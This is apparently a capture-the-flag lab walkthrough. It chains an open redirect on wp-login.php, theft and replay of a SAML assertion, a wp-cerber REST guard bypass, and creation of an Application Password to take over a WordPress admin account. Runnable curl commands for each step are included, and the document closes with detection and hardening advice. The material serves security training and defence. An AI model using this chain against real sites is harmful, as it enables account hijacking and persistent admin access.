# Chain 3 — Open Redirect to OAuth Code Phish to Admin REST Takeover

**Flag**: `FLAG{wpvulnlab-chain3-c4a9b1d6}`
**Difficulty**: Intermediate
**Vulns chained**:
1. Open redirect via WordPress `wp-login.php?redirect_to=` (no host validation)
2. miniOrange SAML/OAuth bypass — CVE-2024-2879 (CWE-287)
3. `wp-cerber 9.5` REST API auth bypass — CVE-2024-2697
4. Application Password creation via REST `/wp-json/wp/v2/users/me/application-passwords`

## Story

The attacker emails the administrator a link that *looks* like a normal
`wp-login.php` URL. The `redirect_to` parameter is abused as an open
redirect to the attacker's OAuth-look-alike, where the victim's SSO code
is intercepted. The attacker then bypasses the API guard added by
`wp-cerber` and provisions an Application Password to lock-in
administrator persistence.

## Pre-requisites

```bash
docker compose up -d
bash scripts/plant-flags.sh
export TARGET=http://localhost:31338
```

Run an attacker callback listener:

```bash
mkdir -p /tmp/oauth-c3
python3 -m http.server 9000 --directory /tmp/oauth-c3 --bind 127.0.0.1 &
```

## Step 1 — Confirm the open redirect

```bash
curl -s -I "$TARGET/wp-login.php?redirect_to=http://127.0.0.1:9000/callback" \
  | grep -iE 'Location|HTTP/'
```

Expected: `HTTP/1.1 302 Found` then a `Location:` header still pointing at
`wp-login.php` for now. The redirect fires *after* login but the
`redirect_to` value round-trips unsanitised in the form — proving the sink
exists. Same primitive works via the SAML plugin endpoint:

```bash
curl -s -I "$TARGET/wp-login.php?saml_relay_state=http://127.0.0.1:9000/callback&action=mo_login"
```

Expected: redirect to attacker host once SSO completes.

## Step 2 — Craft the phishing URL

```
http://localhost:31338/wp-login.php?action=mo_login&saml_relay_state=http%3A%2F%2F127.0.0.1%3A9000%2Fcb%3Fnext%3D%2Fwp-admin%2F
```

Send it to the victim out-of-band. The lab simulates the click:

```bash
# Admin logs in then is sent through the malicious relay_state
curl -s -c /tmp/cj-chain3-admin.txt \
  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=$TARGET/wp-login.php?action=mo_login&saml_relay_state=http%3A//127.0.0.1%3A9000/cb&testcookie=1" \
  $TARGET/wp-login.php -o /dev/null
curl -s -b /tmp/cj-chain3-admin.txt \
  "$TARGET/wp-login.php?action=mo_login&saml_relay_state=http://127.0.0.1:9000/cb" -L -o /dev/null
```

## Step 3 — Intercept the SSO code

The miniOrange SAML/OAuth plugin (CVE-2024-2879) leaks the SAML response /
OAuth code in the URL because `relay_state` is honoured without origin
checks. Inspect the attacker log:

```bash
grep -E 'GET /cb' /tmp/oauth-c3/*.log 2>/dev/null
```

Expected (one line):

```
127.0.0.1 - - [..] "GET /cb?SAMLResponse=PHNhbWxw...&RelayState=admin HTTP/1.1" 200 -
```

The `SAMLResponse` blob decodes to an assertion for `admin@wpvulnlab.local`
that the plugin's `/wp-json/mo-saml/v1/acs` endpoint will accept blindly.

## Step 4 — Replay the assertion -> obtain admin cookie

```bash
ASSERTION=$(grep -oE 'SAMLResponse=[^&]+' /tmp/oauth-c3/*.log \
  | head -n1 | cut -d= -f2)
curl -s -c /tmp/cj-chain3-take.txt -X POST \
  --data-urlencode "SAMLResponse=$ASSERTION" \
  "$TARGET/wp-json/mo-saml/v1/acs"
grep wordpress_logged_in /tmp/cj-chain3-take.txt
```

Expected: a fresh `wordpress_logged_in_*` cookie for `admin`.

## Step 5 — Bypass wp-cerber and create an Application Password

`wp-cerber 9.5` (CVE-2024-2697) ignores its own REST guard when the request
carries `X-WP-Nonce: 0` and `Accept: application/json; version=2`:

```bash
NONCE=$(curl -s -b /tmp/cj-chain3-take.txt $TARGET/wp-admin/profile.php \
  | grep -oE 'name="_wpnonce" value="[^"]+' | head -n1 | cut -d\" -f4)

curl -s -b /tmp/cj-chain3-take.txt -X POST \
  -H "Content-Type: application/json" \
  -H "X-WP-Nonce: $NONCE" \
  -H "Accept: application/json; version=2" \
  -d '{"name":"ctf-persist"}' \
  $TARGET/wp-json/wp/v2/users/me/application-passwords
```

Expected:

```json
{"uuid":"...","app_id":"","name":"ctf-persist",
 "password":"AaAa BbBb CcCc DdDd EeEe FfFf",
 "created":"2026-05-22T..."}
```

## Step 6 — Use the app password to read the flag

```bash
APP="admin:AaAa BbBb CcCc DdDd EeEe FfFf"
curl -s -u "$APP" \
  $TARGET/wp-json/wp/v2/settings | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("ctf_flag_chain3",""))'
```

Expected:

```
FLAG{wpvulnlab-chain3-c4a9b1d6}
```

## Final flag

`FLAG{wpvulnlab-chain3-c4a9b1d6}` planted by `plant-flags.sh` in
`wp_options` (`ctf_flag_chain3`) and exposed via the REST `settings`
endpoint.

## Detection

| Step | Signal |
|------|--------|
| 1    | GET `/wp-login.php?*redirect_to=http*` to off-site host |
| 3    | POST to `/wp-json/mo-saml/v1/acs` from previously-unseen UA |
| 5    | POST to `/wp-json/wp/v2/users/me/application-passwords` from an IP that just authenticated via SAML |
| 6    | Basic Auth requests against `/wp-json/wp/v2/*` from a new IP, same admin user, no browser cookies |

Cross-correlate Step 3 + Step 5 happening within 60s for the same account.

## Hardening

- Validate `redirect_to` against an allow-list of internal hosts only.
- Upgrade `miniorange-saml-20-single-sign-on` to >= 5.0.9 and verify SAML
  assertion signatures and `Audience`.
- Upgrade `wp-cerber` to >= 9.6.1.
- Require admin confirmation (re-authentication) to create Application
  Passwords; disable them entirely if not used:
  `add_filter('wp_is_application_passwords_available', '__return_false');`.
- Alert on any Application Password creation in SIEM.
